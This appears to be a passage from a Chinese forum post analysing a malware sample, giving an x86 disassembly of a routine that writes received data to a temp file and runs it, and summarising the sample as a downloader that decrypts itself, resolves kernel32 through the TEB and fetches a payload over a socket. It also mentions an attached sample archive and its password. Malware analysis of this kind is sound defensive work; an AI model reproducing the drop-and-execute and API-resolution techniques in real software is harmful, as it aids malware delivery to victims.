
```asm
001013E4    8B7D FC         mov     edi, dword ptr [ebp-4]
001013E7    8B07          mov     eax, dword ptr [edi]
001013E9    A3 12131000   mov     dword ptr [101312], eax
001013EE    83C7 04       add     edi, 4
001013F1    836D F8 04    sub     dword ptr [ebp-8], 4
001013F5    897D E8       mov     dword ptr [ebp-18], edi
001013F8    6A 04         push    4
001013FA    FF75 E8       push    dword ptr [ebp-18]
001013FD    E8 B5000000   call    001014B7
00101402    8B7D E8       mov     edi, dword ptr [ebp-18]
00101405    8B0F          mov     ecx, dword ptr [edi]
00101407    294D F8       sub     dword ptr [ebp-8], ecx
0010140A    836D F8 04    sub     dword ptr [ebp-8], 4
0010140E    8345 E8 04    add     dword ptr [ebp-18], 4
00101412    51            push    ecx
00101413    FF75 E8       push    dword ptr [ebp-18]
00101416    E8 9C000000   call    001014B7
0010141B    8B7D E8       mov     edi, dword ptr [ebp-18]
0010141E    897D F4       mov     dword ptr [ebp-C], edi
00101421    894D F0       mov     dword ptr [ebp-10], ecx
00101424    014D E8       add     dword ptr [ebp-18], ecx
00101427    FF35 32131000 push    dword ptr [101332]
0010142D    68 FE000000   push    0FE
00101432    E8 CA040000   call    00101901                  ; jmp 到 kernel32.GetTempPathA
00101437    FF35 36131000 push    dword ptr [101336]
0010143D    6A 00         push    0
0010143F    68 2D131000   push    0010132D                    ; ASCII "4ere"
00101444    FF35 32131000 push    dword ptr [101332]
0010144A    E8 B8040000   call    00101907                  ; jmp 到 kernel32.GetTempFileNameA
0010144F    6A 00         push    0
00101451    68 80000000   push    80
00101456    6A 02         push    2
00101458    6A 00         push    0
0010145A    6A 00         push    0
0010145C    68 00000040   push    40000000
00101461    FF35 36131000 push    dword ptr [101336]
00101467    E8 A1040000   call    0010190D                  ; jmp 到 kernel32.CreateFileA
0010146C    50            push    eax
0010146D    6A 00         push    0
0010146F    8BDC          mov     ebx, esp
00101471    6A 00         push    0
00101473    53            push    ebx
00101474    FF75 F0       push    dword ptr [ebp-10]
00101477    FF75 F4       push    dword ptr [ebp-C]
0010147A    50            push    eax
0010147B    E8 99040000   call    00101919                  ; jmp 到 kernel32.WriteFile
00101480    5B            pop     ebx
00101481    E8 99040000   call    0010191F                  ; jmp 到 kernel32.CloseHandle
00101486    FF35 48131000 push    dword ptr [101348]
0010148C    FF35 3A131000 push    dword ptr [10133A]
00101492    6A 00         push    0
00101494    6A 00         push    0
00101496    6A 20         push    20
00101498    6A 00         push    0
0010149A    6A 00         push    0
0010149C    6A 00         push    0
0010149E    6A 00         push    0
001014A0    FF35 36131000 push    dword ptr [101336]
001014A6    E8 68040000   call    00101913                  ; jmp 到 kernel32.CreateProcessA
001014AB    837D F8 00    cmp     dword ptr [ebp-8], 0
001014AF  ^ 0F85 43FFFFFF jnz     001013F8
001014B5    C9            leave
001014B6    C3            retn
```

看来是个下载者。

重新梳理思路：

正规软件函数的入口，然后用回调函数去改变执行流程。启动双线程去给自己真正的代码解密，然后通过`TEB`查找`kernel32`的基址，根据输出表查找`GetProcess`、`LoadLibrary`这样就有了后面所用到的函数地址。

然后`socket`去发送一段指令，`recv`循环接收，接收完后在`"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\"`下`CreateFile`，然后用`WriteFile`去写入刚才接收的。最后`CreateProcess`去启动。

不足处请前辈们指出。

源程序见附件。

上传的附件

`![](img/620251b33676a8e4b98ca0ece915ee8d.jpg)` | `info.rar` (解压密码是：`muma`)
